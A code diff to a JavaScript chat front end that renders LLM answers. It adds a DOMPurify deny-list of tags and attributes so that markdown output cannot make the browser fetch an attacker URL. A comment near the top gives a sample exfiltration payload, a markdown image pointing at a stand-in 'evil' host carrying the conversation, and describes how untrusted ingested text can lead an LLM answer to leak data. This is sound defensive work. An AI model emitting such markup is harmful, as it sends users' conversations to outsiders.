@@ -51,6 +51,24 @@
         return div.innerHTML;
     }
 
+    // Answers are LLM output built from ingested (untrusted) text, so they are sanitised after
+    // markdown rendering. DOMPurify already blocks script execution; the extra rules close a
+    // second channel: markup whose only effect is that the BROWSER requests an attacker URL by
+    // itself (![](https://evil/?q=<conversation>), CSS url(), <link>, <video poster>...), which
+    // exfiltrates the conversation with no script at all. Legal answers need none of these tags;
+    // ordinary links (<a href>) are untouched.
+    const SANITIZE_CONFIG = {
+        FORBID_TAGS: [
+            'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'use', 'svg', 'math',
+            'style', 'link', 'form', 'input', 'button', 'textarea', 'select',
+        ],
+        FORBID_ATTR: ['style', 'srcset', 'poster', 'background', 'ping'],
+    };
+
+    function renderMarkdown(text) {
+        return DOMPurify.sanitize(marked.parse(text), SANITIZE_CONFIG);
+    }
+
     // Escape for a double-quoted HTML ATTRIBUTE. escapeHtml() is not enough there: it leaves
     // quotes untouched, so a value containing " or ' could close the attribute (or a JS string
     // inside an inline handler) and inject code.
@@ -554,7 +572,7 @@
 
         let messageBodyContent;
         try {
-            messageBodyContent = DOMPurify.sanitize(marked.parse(text));
+            messageBodyContent = renderMarkdown(text);
         } catch (e) {
             messageBodyContent = escapeHtml(text).replace(/\n/g, '<br>');
         }
@@ -667,7 +685,7 @@
 
         if (skipStreaming) {
             if (messageBody && typeof marked !== 'undefined' && typeof DOMPurify !== 'undefined') {
-                messageBody.innerHTML = DOMPurify.sanitize(marked.parse(answer));
+                messageBody.innerHTML = renderMarkdown(answer);
             } else {
                 messageBody.textContent = answer;
             }
@@ -923,13 +941,13 @@
         const words = text.split(/(\s+)/);
         let wordIndex = 0;
         const speed = 15;
-        const fullHtml = DOMPurify.sanitize(marked.parse(text));
+        const fullHtml = renderMarkdown(text);
 
         function type() {
             if (wordIndex < words.length) {
                 const visibleText = words.slice(0, wordIndex + 1).join('');
                 try {
-                    element.innerHTML = DOMPurify.sanitize(marked.parse(visibleText));
+                    element.innerHTML = renderMarkdown(visibleText);
                 } catch (e) {
                     element.textContent = visibleText;
                 }
@@ -1243,7 +1261,7 @@
                             accumulatedText += chunk;
                             if (streamElements && streamElements.messageBody) {
                                 try {
-                                    streamElements.messageBody.innerHTML = DOMPurify.sanitize(marked.parse(accumulatedText));
+                                    streamElements.messageBody.innerHTML = renderMarkdown(accumulatedText);
                                 } catch (e) {
                                     streamElements.messageBody.textContent = accumulatedText;
                                 }
